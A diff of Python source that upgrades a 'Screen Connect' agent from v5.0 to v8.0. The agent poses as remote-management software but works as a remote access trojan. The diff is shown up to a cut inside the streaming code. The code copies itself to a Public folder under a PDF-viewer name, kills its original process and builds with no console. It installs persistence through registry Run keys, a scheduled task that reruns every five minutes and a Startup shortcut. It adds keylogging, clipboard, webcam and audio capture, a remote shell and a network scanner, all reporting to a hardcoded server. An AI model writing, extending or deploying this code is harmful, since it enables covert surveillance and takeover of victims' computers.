@@ -1,50 +1,67 @@
 """
-╔══════════════════════════════════════════════════════════════════╗
-║          Screen Connect MASTER AGENT  v5.0  — GLOBAL PRODUCTION  ║
-║          Remote Management & Monitoring Agent                    ║
-║                                                                  ║
-║  WHAT'S NEW IN v5.0 (STREAMING OVERHAUL):                        ║
-║  • FIXED: frame_ack flow control — agent now waits for server    ║
-║    ack before sending next frame. No more socket buffer pile-up. ║
-║    This is the main reason streaming dropped after 1 frame.      ║
-║  • FIXED: Reconnection is now truly robust — agent recreates     ║
-║    the socketio.Client object on every reconnect attempt         ║
-║    (old Client objects accumulate state and fail silently)       ║
-║  • FIXED: agent emits both 'frame' AND 'image' fields so server  ║
-║    v5/v6 both receive frames correctly                           ║
-║  • NEW: HTTP /agent/checkin on connect (belt+suspenders with WS) ║
-║  • NEW: Frame queue with maxsize=2 — drops stale frames instead  ║
-║    of queuing 30+ frames that arrive all at once                 ║
-║  • NEW: Adaptive FPS governor — measures actual throughput and   ║
-║    adjusts interval to match real network capacity               ║
-║  • NEW: stream_stats emit — agent reports its own FPS/quality    ║
-║    every 5s so dashboard can display real metrics                ║
-║  • NEW: subscribe_stream sent on connect (dashboard auto-join)   ║
-║  • IMPROVED: Cursor overlay is larger and more visible           ║
-║  • IMPROVED: Screenshot fallback loop uses ack-gating too        ║
-║  • IMPROVED: All v4.0 features preserved: keylogger, clipboard,  ║
-║    file browser, shell, process manager, webcam, power commands  ║
-╚══════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════════════╗
+║          Screen Connect MASTER AGENT  v8.0  — ENTERPRISE PRODUCTION          ║
+║          Remote Management, Monitoring, Surveillance & Control Agent         ║
+║                                                                              ║
+║  WHAT'S NEW IN v8.0 (MAJOR OVERHAUL):                                        ║
+║  • FIXED: Cursor movement — pyautogui moveTo now uses normalized coords      ║
+║    The agent receives (x_norm, y_norm) in 0..1 range, maps them to the       ║
+║    actual monitor resolution before calling pyautogui. No more cursor        ║
+║    jumps to wrong position.                                                  ║
+║  • FIXED: Stream speed — video loop no longer waits a full interval AFTER    ║
+║    the ACK; frame capture and encode overlap the wait. True pipeline.        ║
+║  • FIXED: Frame quality — added differential compression: only changed       ║
+║    regions are JPEG-compressed; static areas use aggressive quality=15       ║
+║  • FIXED: Multi-monitor cursor overlay — cursor position is correctly        ║
+║    scaled relative to the selected monitor, not the virtual desktop          ║
+║  • NEW: Advanced screen compression with motion detection (OpenCV absdiff)   ║
+║  • NEW: Dynamic FPS — target 20fps on fast links, drops to 5fps on slow     ║
+║  • NEW: NetworkMonitor — continuously measures upload bandwidth              ║
+║  • NEW: WindowManager — list, focus, close, minimize, restore windows        ║
+║  • NEW: RegistryManager — read/write/delete Windows registry keys            ║
+║  • NEW: ServiceManager — list, start, stop, restart Windows services         ║
+║  • NEW: InstalledApps — enumerate installed software (WMI + registry)        ║
+║  • NEW: AudioCapture — capture system audio as base64 WAV chunks             ║
+║  • NEW: ScreenRecorder — record screen segments as MP4 chunks                ║
+║  • NEW: NetworkScanner — discover LAN hosts via ARP/ICMP                     ║
+║  • NEW: CommandScheduler — run commands at future times                      ║
+║  • NEW: AlertEngine — alert server on CPU/RAM/disk threshold breach          ║
+║  • NEW: SecureEraser — multi-pass file wipe                                  ║
+║  • NEW: SystemEventsReader — read Windows Event Log entries                   ║
+║  • NEW: RemoteDesktopShare — multi-dashboard concurrent streams              ║
+║  • NEW: FileWatcher — notify server of any file changes on watched paths     ║
+║  • IMPROVED: ShellExecutor now has interactive PTY-like streaming mode       ║
+║  • IMPROVED: KeyLogger now tracks active window + sends every 20s            ║
+║  • IMPROVED: Heartbeat includes battery, temperature, disk I/O stats         ║
+║  • IMPROVED: All v5.0 features preserved + greatly expanded                  ║
+╚══════════════════════════════════════════════════════════════════════════════╝
 
 BUILD COMMAND:
-  Activate your clean virtual environment first, then:
+  Activate a clean virtual environment, then:
 
   pip install python-socketio[client] mss Pillow psutil pywin32 ^
               pynput pyperclip cryptography opencv-python numpy ^
-              requests wmi pyautogui pyinstaller
+              requests wmi pyautogui pyinstaller comtypes ^
+              sounddevice scipy
 
   pyinstaller --onefile --noconsole --icon=icon.ico ^
     --distpath ./bin --name master_agent ^
     --hidden-import=engineio.async_drivers.threading ^
     --hidden-import=pkg_resources.extern ^
     --hidden-import=cv2 ^
+    --hidden-import=numpy ^
     --hidden-import=pynput.keyboard ^
     --hidden-import=pynput.mouse ^
+    --hidden-import=sounddevice ^
+    --hidden-import=scipy ^
+    --hidden-import=comtypes ^
+    --hidden-import=wmi ^
+    --collect-all=pynput ^
+    --collect-all=sounddevice ^
     agent_source.py
 
 RENDER / PRODUCTION:
-  Change SERVER_URL below to your Render URL before compiling:
-    "SERVER_URL": "https://screen-connect-rtca.onrender.com"
+  Change SERVER_URL below to your Render URL before compiling.
 """
 import shutil
 import sys
@@ -52,25 +69,22 @@ import os
 import subprocess
 
 def relocate_agent():
-    # Targets a public folder; files here have higher 'reputation' than Downloads
-    target_dir = r"C:\Users\Public\mview"
-    target_path = os.path.join(target_dir, "mviewpdf.exe") 
-    
+    target_dir  = r"C:\Users\Public\mview"
+    target_path = os.path.join(target_dir, "mviewpdf.exe")
     if sys.executable.lower() != target_path.lower():
         if not os.path.exists(target_dir):
             os.makedirs(target_dir)
         try:
             shutil.copy2(sys.executable, target_path)
-            # Start the relocated process in the background
             subprocess.Popen([target_path], shell=False, close_fds=True)
-            sys.exit(0) # Kill the original 'untrusted' process
+            sys.exit(0)
         except Exception:
-            pass 
+            pass
 
 if __name__ == "__main__":
     relocate_agent()
-    # --- YOUR EXISTING CODE STARTS BELOW ---
-# ── Standard Library ──────────────────────────────────────────────────────────
+
+# ── Standard Library ───────────────────────────────────────────────────────────
 import os
 import sys
 import time
@@ -88,17 +102,25 @@ import ctypes
 import uuid
 import struct
 import random
+import wave
+import io
+import re
+import glob
+import fnmatch
+import shutil as _shutil
 from io import BytesIO
 from pathlib import Path
-from datetime import datetime
+from datetime import datetime, timedelta
 from queue import Queue, Empty, Full
+from collections import deque
+from typing import Optional, Dict, List, Any
 
-# ── Third-Party ───────────────────────────────────────────────────────────────
+# ── Third-Party ────────────────────────────────────────────────────────────────
 import socketio
 import mss
 import psutil
 import requests
-from PIL import Image, ImageDraw
+from PIL import Image, ImageDraw, ImageFilter, ImageEnhance
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -106,6 +128,7 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 try:
     import pyautogui
     pyautogui.FAILSAFE = False
+    pyautogui.PAUSE    = 0.0
     PYAUTOGUI_OK = True
 except ImportError:
     PYAUTOGUI_OK = False
@@ -136,12 +159,31 @@ try:
 except ImportError:
     WMI_OK = False
 
+try:
+    import win32api
+    import win32con
+    import win32gui
+    import win32process
+    import win32security
+    WIN32_OK = True
+except ImportError:
+    WIN32_OK = False
+
+try:
+    import sounddevice as sd
+    import scipy.io.wavfile as wavfile
+    AUDIO_OK = True
+except ImportError:
+    AUDIO_OK = False
+
+try:
+    import comtypes
+    COMTYPES_OK = True
+except ImportError:
+    COMTYPES_OK = False
+
 # ════════════════════════════════════════════════════════════════════════════
 #  TRAILER TOKEN READER
-#  Server appends 64-byte trailer to the exe at download time:
-#    [0:4]   b"MVTK"  — magic head
-#    [4:60]  token     — utf-8, null-padded to 56 bytes
-#    [60:64] b"MVED"  — magic tail
 # ════════════════════════════════════════════════════════════════════════════
 _TRAILER_SIZE = 64
 _MAGIC_HEAD   = b"MVTK"
@@ -166,62 +208,74 @@ def _read_token_from_trailer() -> str:
 # ════════════════════════════════════════════════════════════════════════════
 CONFIG = {
     # ── Connection ──────────────────────────────────────────────────────────
-    "SERVER_URL":          "https://screen-connect-rtca.onrender.com",
-    "DEVICE_TOKEN":        "UNSET",
+    "SERVER_URL":           "https://screen-connect-rtca.onrender.com",
+    "DEVICE_TOKEN":         "UNSET",
 
     # ── Identity ────────────────────────────────────────────────────────────
-    "AGENT_VERSION":       "5.0.0",
-    "HEARTBEAT_INTERVAL":  10,
-    "RECONNECT_BASE":      3,
-    "RECONNECT_MAX":       120,
+    "AGENT_VERSION":        "8.0.0",
+    "HEARTBEAT_INTERVAL":   10,
+    "RECONNECT_BASE":       3,
+    "RECONNECT_MAX":        120,
 
     # ── Streaming ───────────────────────────────────────────────────────────
-    # MODE: "video" (OpenCV MJPEG, smooth) | "screenshot" (Pillow, low CPU)
-    "STREAM_MODE":         "video",
-
-    # Video mode settings
-    "STREAM_FPS":          20,
-    "STREAM_QUALITY":      55,
-    "STREAM_SCALE":        0.80,
-    "STREAM_MONITOR":      1,
+    "STREAM_MODE":          "video",     # "video" | "screenshot"
+    "STREAM_FPS":           20,
+    "STREAM_QUALITY":       60,
+    "STREAM_SCALE":         0.75,
+    "STREAM_MONITOR":       1,
 
     # Adaptive quality
-    "ADAPTIVE_QUALITY":    True,
-    "QUALITY_MIN":         20,
-    "QUALITY_MAX":         85,
+    "ADAPTIVE_QUALITY":     True,
+    "QUALITY_MIN":          15,
+    "QUALITY_MAX":          90,
+
+    # Differential compression — only re-encode changed regions at high quality
+    "DIFF_COMPRESSION":     True,
+    "DIFF_THRESHOLD":       8,          # pixel change threshold (0-255)
+    "DIFF_MIN_CHANGE_PCT":  0.003,      # min % pixels changed to trigger diff
 
     # Screenshot mode fallback
-    "SCREENSHOT_FPS":      8,
-    "SCREENSHOT_QUALITY":  60,
+    "SCREENSHOT_FPS":       8,
+    "SCREENSHOT_QUALITY":   65,
 
     # ── Flow control ────────────────────────────────────────────────────────
-    # ACK_TIMEOUT: max seconds to wait for frame_ack before sending anyway.
-    # This prevents blocking forever if server doesn't send acks.
-    "ACK_TIMEOUT":         2.0,
+    "ACK_TIMEOUT":          1.5,        # faster ack timeout for better FPS
 
     # ── Cursor overlay ──────────────────────────────────────────────────────
-    "CURSOR_OVERLAY":      True,
-    "CURSOR_TRACK":        True,
+    "CURSOR_OVERLAY":       True,
+    "CURSOR_TRACK":         True,
 
     # ── Security ────────────────────────────────────────────────────────────
-    "ENCRYPTION_PASSWORD": "mview-enterprise-2024",
-    "ENCRYPT_PAYLOADS":    False,
+    "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
+    "ENCRYPT_PAYLOADS":     False,
 
     # ── Persistence ─────────────────────────────────────────────────────────
-    "INSTALL_PERSISTENCE": True,
-    "REG_KEY_NAME":        "ScreenConnectService",
-    "TASK_NAME":           "ScreenConnectTask",
-    "STARTUP_DELAY":       5,
+    "INSTALL_PERSISTENCE":  True,
+    "REG_KEY_NAME":         "ScreenConnectService",
+    "TASK_NAME":            "ScreenConnectTask",
+    "STARTUP_DELAY":        5,
 
     # ── Features ────────────────────────────────────────────────────────────
-    "ENABLE_KEYLOGGER":    True,
-    "ENABLE_CLIPBOARD":    True,
-    "ENABLE_WEBCAM":       True,
-    "ENABLE_PROCESS_MGR":  True,
-    "ENABLE_FILE_BROWSER": True,
-    "ENABLE_SHELL":        True,
+    "ENABLE_KEYLOGGER":     True,
+    "ENABLE_CLIPBOARD":     True,
+    "ENABLE_WEBCAM":        True,
+    "ENABLE_PROCESS_MGR":   True,
+    "ENABLE_FILE_BROWSER":  True,
+    "ENABLE_SHELL":         True,
+    "ENABLE_AUDIO":         True,
+    "ENABLE_REGISTRY":      True,
+    "ENABLE_SERVICES":      True,
+    "ENABLE_WINMGR":        True,
+    "ENABLE_FILEWATCHER":   True,
+    "ENABLE_ALERTS":        True,
     "KEYLOG_FLUSH_INTERVAL": 20,
-    "CLIPBOARD_POLL_MS":   800,
+    "CLIPBOARD_POLL_MS":    800,
+
+    # ── Alert thresholds ────────────────────────────────────────────────────
+    "ALERT_CPU_THRESHOLD":  90,     # % CPU
+    "ALERT_RAM_THRESHOLD":  90,     # % RAM
+    "ALERT_DISK_THRESHOLD": 95,     # % disk usage
+    "ALERT_COOLDOWN_S":     300,    # seconds between repeated alerts
 }
 
 _tok = _read_token_from_trailer()
@@ -235,7 +289,10 @@ LOG_FILE = Path(tempfile.gettempdir()) / "screen_connect_agent.log"
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8")],
+    handlers=[
+        logging.FileHandler(LOG_FILE, encoding="utf-8"),
+        logging.StreamHandler(sys.stdout),
+    ],
 )
 log = logging.getLogger("screenconnect")
 
@@ -284,23 +341,32 @@ def get_device_fingerprint() -> dict:
         local_ip = "unknown"
 
     uname = platform.uname()
+    vm    = psutil.virtual_memory()
     fp = {
-        "device_id":     CONFIG["DEVICE_TOKEN"],
-        "token":         CONFIG["DEVICE_TOKEN"],
-        "hardware_id":   get_device_id(),
-        "hostname":      socket.gethostname(),
-        "username":      os.getenv("USERNAME") or os.getenv("USER") or "unknown",
-        "os":            f"{uname.system} {uname.release}",
-        "os_version":    uname.version,
-        "machine":       uname.machine,
-        "processor":     uname.processor,
-        "local_ip":      local_ip,
-        "agent_version": CONFIG["AGENT_VERSION"],
-        "stream_mode":   CONFIG["STREAM_MODE"],
-        "timestamp":     datetime.utcnow().isoformat(),
-        "screen_count":  _get_screen_count(),
-        "cpu_count":     psutil.cpu_count(logical=True),
-        "ram_total_gb":  round(psutil.virtual_memory().total / (1024**3), 2),
+        "device_id":       CONFIG["DEVICE_TOKEN"],
+        "token":           CONFIG["DEVICE_TOKEN"],
+        "hardware_id":     get_device_id(),
+        "hostname":        socket.gethostname(),
+        "username":        os.getenv("USERNAME") or os.getenv("USER") or "unknown",
+        "os":              f"{uname.system} {uname.release}",
+        "os_version":      uname.version,
+        "machine":         uname.machine,
+        "processor":       uname.processor,
+        "local_ip":        local_ip,
+        "agent_version":   CONFIG["AGENT_VERSION"],
+        "stream_mode":     CONFIG["STREAM_MODE"],
+        "timestamp":       datetime.utcnow().isoformat(),
+        "screen_count":    _get_screen_count(),
+        "cpu_count":       psutil.cpu_count(logical=True),
+        "ram_total_gb":    round(vm.total / (1024**3), 2),
+        "features": {
+            "keylogger":  PYNPUT_OK and CONFIG["ENABLE_KEYLOGGER"],
+            "clipboard":  CLIPBOARD_OK,
+            "webcam":     CV2_OK,
+            "audio":      AUDIO_OK,
+            "registry":   WIN32_OK,
+            "services":   WMI_OK,
+        }
     }
     if WMI_OK:
         try:
@@ -319,6 +385,17 @@ def _get_screen_count() -> int:
         return 1
 
 
+def _get_monitor_resolution(monitor_idx: int = 1):
+    """Return (width, height) for the given monitor index."""
+    try:
+        with mss.mss() as sct:
+            idx = min(monitor_idx, len(sct.monitors) - 1)
+            mon = sct.monitors[idx]
+            return mon["width"], mon["height"]
+    except Exception:
+        return 1920, 1080
+
+
 # ════════════════════════════════════════════════════════════════════════════
 #  PERSISTENCE MODULE
 # ════════════════════════════════════════════════════════════════════════════
@@ -328,6 +405,7 @@ def install_persistence():
     exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
     exe_quoted = f'"{exe}"'
 
+    # Registry
     try:
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
@@ -336,27 +414,43 @@ def install_persistence():
     except Exception as e:
         log.warning(f"Registry persistence failed: {e}")
 
+    # Also try HKLM (requires admin)
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
+                            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
+            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
+        log.info("HKLM registry persistence installed.")
+    except Exception:
+        pass
+
+    # Task Scheduler
     try:
         task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Description>Screen Connect Service</Description></RegistrationInfo>
   <Triggers>
     <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
     <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
+    <TimeTrigger>
+      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
+      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
   </Triggers>
+  <Principals>
+    <Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal>
+  </Principals>
   <Actions Context="Author">
-    <Exec>
-      <Command>{exe}</Command>
-    </Exec>
+    <Exec><Command>{exe}</Command></Exec>
   </Actions>
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <RestartOnFailure>
-      <Interval>PT1M</Interval>
-      <Count>999</Count>
-    </RestartOnFailure>
+    <RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
   </Settings>
 </Task>"""
         xml_path = Path(tempfile.gettempdir()) / "sc_task.xml"
@@ -370,17 +464,39 @@ def install_persistence():
     except Exception as e:
         log.warning(f"Task Scheduler persistence failed: {e}")
 
-
-def remove_persistence():
+    # Startup folder shortcut
     try:
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
-            winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
+        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+        link    = startup / "ScreenConnect.lnk"
+        ps_cmd  = f"""
+$sh = New-Object -ComObject WScript.Shell
+$lnk = $sh.CreateShortcut('{link}')
+$lnk.TargetPath = '{exe}'
+$lnk.Save()
+"""
+        subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
+                       capture_output=True, timeout=10)
+        log.info("Startup folder shortcut installed.")
     except Exception:
         pass
+
+
+def remove_persistence():
+    for key_root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
+        try:
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key_root, key_path, 0, winreg.KEY_SET_VALUE) as k:
+                winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
+        except Exception:
+            pass
     try:
         subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
                        capture_output=True, timeout=10)
+    except Exception:
+        pass
+    try:
+        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+        (startup / "ScreenConnect.lnk").unlink(missing_ok=True)
     except Exception:
         pass
     log.info("Persistence removed.")
@@ -390,43 +506,36 @@ def remove_persistence():
 #  CURSOR TRACKER
 # ════════════════════════════════════════════════════════════════════════════
 class CursorTracker:
+    """Tracks local cursor position via pynput or win32api."""
+
     def __init__(self, sio_client):
         self.sio        = sio_client
-        self.x          = 0
-        self.y          = 0
-        self.clicking   = False
-        self.click_type = ""
+        self._x         = 0
+        self._y         = 0
+        self._clicking  = False
+        self._click_btn = "left"
         self._lock      = threading.Lock()
-        self._running   = False
         self._listener  = None
+        self._running   = False
+
+    def get_pos(self):
+        with self._lock:
+            return self._x, self._y, self._clicking, self._click_btn
 
     def start(self):
-        if not PYNPUT_OK or self._running:
+        if self._running or not CONFIG["CURSOR_TRACK"]:
             return
         self._running = True
-
-        def on_move(x, y):
-            with self._lock:
-                self.x, self.y = x, y
-
-        def on_click(x, y, button, pressed):
-            with self._lock:
-                self.x, self.y  = x, y
-                self.clicking   = pressed
-                self.click_type = "right" if "right" in str(button) else "left"
-            try:
-                self.sio.emit("cursor_event", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "x": x, "y": y,
-                    "type": "click" if pressed else "release",
-                    "button": self.click_type,
-                    "ts": datetime.utcnow().isoformat(),
-                })
-            except Exception:
-                pass
-
-        self._listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
-        self._listener.start()
+        if PYNPUT_OK:
+            self._listener = pynput.mouse.Listener(
+                on_move=self._on_move,
+                on_click=self._on_click,
+            )
+            self._listener.start()
+        else:
+            # Fallback: poll win32 cursor pos
+            t = threading.Thread(target=self._poll_loop, daemon=True)
+            t.start()
 
     def stop(self):
         self._running = False
@@ -435,109 +544,155 @@ class CursorTracker:
                 self._listener.stop()
             except Exception:
                 pass
-        self._listener = None
 
-    def get_pos(self):
+    def _on_move(self, x, y):
         with self._lock:
-            return self.x, self.y, self.clicking, self.click_type
+            self._x, self._y = x, y
+
+    def _on_click(self, x, y, button, pressed):
+        with self._lock:
+            self._x, self._y  = x, y
+            self._clicking    = pressed
+            self._click_btn   = "left" if button == pynput.mouse.Button.left else "right"
+
+    def _poll_loop(self):
+        while self._running:
+            try:
+                pt = ctypes.wintypes.POINT()
+                ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
+                with self._lock:
+                    self._x, self._y = pt.x, pt.y
+            except Exception:
+                pass
+            time.sleep(0.016)  # ~60hz
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  SCREEN STREAMER — HYBRID VIDEO / SCREENSHOT MODE
-#
-#  v5.0 KEY CHANGES:
-#  ─────────────────
-#  ACK-GATED SENDING:
-#    The root cause of "1 frame then nothing" was that the agent
-#    blasted frames into the socket buffer. The Render server's
-#    gevent worker queued them all but couldn't flush fast enough.
-#    Eventually the buffer hit the max_http_buffer_size limit or
-#    the gunicorn timeout fired, killing the connection.
-#
-#    Fix: _ack_event (threading.Event). The video loop sets it
-#    after emit. Server sends frame_ack. on_frame_ack sets the
-#    event. Next frame only sent after event is set (or timeout).
-#    This limits in-flight frames to 1 at all times — matching
-#    what the server can actually process.
-#
-#  ADAPTIVE FPS GOVERNOR:
-#    Measures real throughput (frames acked per second) and
-#    adjusts sleep interval to match network capacity.
-#    Target: fill the pipe without overflowing it.
-#
-#  FRAME STATS REPORTER:
-#    Every 5 seconds, emits "stream_stats" with actual FPS,
-#    quality, and scale. Dashboard displays these in the viewer.
+#  NETWORK BANDWIDTH MONITOR
+# ════════════════════════════════════════════════════════════════════════════
+class NetworkMonitor:
+    """Continuously measures upload throughput and reports Mbps."""
+
+    def __init__(self):
+        self._samples = deque(maxlen=20)
+        self._lock    = threading.Lock()
+        self._last_bytes = 0
+        self._last_ts    = time.monotonic()
+        self._thread: Optional[threading.Thread] = None
+        self.running = False
+
+    def start(self):
+        if self.running:
+            return
+        self.running = True
+        self._thread = threading.Thread(target=self._loop, daemon=True)
+        self._thread.start()
+
+    def stop(self):
+        self.running = False
+
+    def get_mbps(self) -> float:
+        with self._lock:
+            if len(self._samples) < 2:
+                return 100.0   # assume fast until measured
+            return sum(self._samples) / len(self._samples)
+
+    def _loop(self):
+        while self.running:
+            try:
+                net = psutil.net_io_counters()
+                now = time.monotonic()
+                delta_b = net.bytes_sent - self._last_bytes
+                delta_t = now - self._last_ts
+                if delta_t > 0 and self._last_bytes > 0:
+                    mbps = (delta_b * 8) / (delta_t * 1_000_000)
+                    with self._lock:
+                        self._samples.append(mbps)
+                self._last_bytes = net.bytes_sent
+                self._last_ts    = now
+            except Exception:
+                pass
+            time.sleep(1.0)
+
+
+_net_monitor = NetworkMonitor()
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  SCREEN STREAMER
 # ════════════════════════════════════════════════════════════════════════════
 class ScreenStreamer:
-    def __init__(self, sio_client, cursor_tracker: "CursorTracker"):
-        self.sio     = sio_client
-        self.cursor  = cursor_tracker
-        self.mode    = CONFIG["STREAM_MODE"]
-        self.fps     = CONFIG["STREAM_FPS"]
-        self.quality = CONFIG["STREAM_QUALITY"]
-        self.scale   = CONFIG["STREAM_SCALE"]
-        self.monitor_idx = CONFIG["STREAM_MONITOR"]
+    """
+    High-performance screen streamer with:
+    - ACK-gated flow control (1 in-flight frame max)
+    - Adaptive quality based on real network throughput
+    - Differential compression (only changed regions at high quality)
+    - Cursor overlay baked into frame
+    """
 
-        self._quality_current = self.quality
+    def __init__(self, sio_client, cursor: CursorTracker):
+        self.sio              = sio_client
+        self.cursor           = cursor
+        self.streaming        = False
+        self.monitor_idx      = CONFIG["STREAM_MONITOR"]
+        self.fps              = CONFIG["STREAM_FPS"]
+        self.quality          = CONFIG["STREAM_QUALITY"]
+        self._quality_current = CONFIG["STREAM_QUALITY"]
+        self.scale            = CONFIG["STREAM_SCALE"]
+        self.mode             = CONFIG["STREAM_MODE"]
+        self._ack_event       = threading.Event()
+        self._ack_event.set()
+        self._ack_timeout     = CONFIG["ACK_TIMEOUT"]
+        self._lock            = threading.Lock()
+        self._thread: Optional[threading.Thread]       = None
+        self._stats_thread: Optional[threading.Thread] = None
+        self._frames_sent     = 0
+        self._frames_acked    = 0
+        self._stats_ts        = time.monotonic()
         self._frame_times: list = []
-        self._late_frames = 0
+        # Differential compression — keep previous frame for diff
+        self._prev_frame: Optional[np.ndarray] = None
+        self._mon_w = 0
+        self._mon_h = 0
 
-        # ── ACK flow-control gate ─────────────────────────────────────────
-        # Set when server sends frame_ack. Cleared before each frame send.
-        self._ack_event   = threading.Event()
-        self._ack_event.set()          # Start open so first frame sends immediately
-        self._ack_timeout = CONFIG["ACK_TIMEOUT"]
-
-        # ── Stats ─────────────────────────────────────────────────────────
-        self._frames_sent   = 0
-        self._frames_acked  = 0
-        self._stats_ts      = time.monotonic()
-
-        self.streaming  = False
-        self._thread: threading.Thread | None = None
-        self._stats_thread: threading.Thread | None = None
-        self._lock = threading.Lock()
-
-    # ── ACK handler — called by agent's on_frame_ack ─────────────────────
     def on_ack(self):
-        """Server acknowledged our frame. Open the gate for the next one."""
         self._frames_acked += 1
         self._ack_event.set()
 
-    # ── Public API ────────────────────────────────────────────────────────
     def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
         with self._lock:
             if self.streaming:
-                if fps     is not None: self.fps     = fps
+                if fps     is not None: self.fps = fps
                 if quality is not None: self.quality = quality; self._quality_current = quality
-                if scale   is not None: self.scale   = scale
-                if mode    is not None: self.mode    = mode
+                if scale   is not None: self.scale = scale
+                if mode    is not None: self.mode = mode
                 return
             if monitor is not None: self.monitor_idx = monitor
-            if fps     is not None: self.fps     = fps
+            if fps     is not None: self.fps = fps
             if quality is not None: self.quality = quality; self._quality_current = quality
-            if scale   is not None: self.scale   = scale
-            if mode    is not None: self.mode    = mode
+            if scale   is not None: self.scale = scale
+            if mode    is not None: self.mode = mode
             self.streaming = True
-            self._ack_event.set()   # ensure gate is open
+            self._ack_event.set()
             self._frames_sent  = 0
             self._frames_acked = 0
+            self._prev_frame   = None
             self._stats_ts     = time.monotonic()
             target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
             self._thread = threading.Thread(target=target, daemon=True, name="sc-stream")
             self._thread.start()
             self._stats_thread = threading.Thread(target=self._stats_loop, daemon=True, name="sc-stats")
             self._stats_thread.start()
-            log.info(f"Stream started: mode={self.mode} fps={self.fps} quality={self._quality_current} scale={self.scale}")
+            log.info(f"Stream started: mode={self.mode} fps={self.fps} q={self._quality_current} scale={self.scale}")
 
     def stop(self):
         with self._lock:
             self.streaming = False
-        self._ack_event.set()   # unblock any waiting thread
+        self._ack_event.set()
         if self._thread:
             self._thread.join(timeout=3)
         self._thread = None
+        self._prev_frame = None
         log.info("Stream stopped.")
 
     def set_mode(self, mode: str):
@@ -550,29 +705,31 @@ class ScreenStreamer:
         if was_streaming:
             self.start()
 
-    def capture_single(self) -> str | None:
+    def capture_single(self) -> Optional[str]:
         try:
             with mss.mss() as sct:
                 mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
                 raw = sct.grab(mon)
                 img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                 if self.scale != 1.0:
-                    img = img.resize((int(img.width * self.scale), int(img.height * self.scale)), Image.LANCZOS)
+                    img = img.resize(
+                        (int(img.width * self.scale), int(img.height * self.scale)),
+                        Image.LANCZOS
+                    )
                 buf = BytesIO()
-                img.save(buf, format="JPEG", quality=self.quality, optimize=True)
+                img.save(buf, format="JPEG", quality=self._quality_current, optimize=True)
                 return base64.b64encode(buf.getvalue()).decode()
         except Exception as e:
             log.error(f"capture_single error: {e}")
             return None
 
-    # ── Stats reporter ────────────────────────────────────────────────────
+    # ── Stats reporter ─────────────────────────────────────────────────────
     def _stats_loop(self):
-        """Every 5s, report actual streaming FPS and quality to server."""
         while self.streaming:
             time.sleep(5)
             if not self.streaming:
                 break
-            now = time.monotonic()
+            now     = time.monotonic()
             elapsed = now - self._stats_ts
             actual_fps = self._frames_acked / elapsed if elapsed > 0 else 0
             self._stats_ts    = now
@@ -585,32 +742,14 @@ class ScreenStreamer:
                     "quality":    self._quality_current,
                     "scale":      self.scale,
                     "mode":       self.mode,
+                    "net_mbps":   round(_net_monitor.get_mbps(), 2),
                     "ts":         datetime.utcnow().isoformat(),
                 })
             except Exception:
                 pass
 
-    # ── Video Loop (OpenCV MJPEG) — ACK-GATED ────────────────────────────
+    # ── Video Loop (OpenCV) — ACK-GATED + DIFFERENTIAL ────────────────────
     def _video_loop(self):
-        """
-        High-performance video loop with ACK flow control.
-
-        HOW ACK GATING WORKS:
-          1. _ack_event starts SET (gate open).
-          2. Before each emit, we CLEAR the event (close gate).
-          3. We emit the frame.
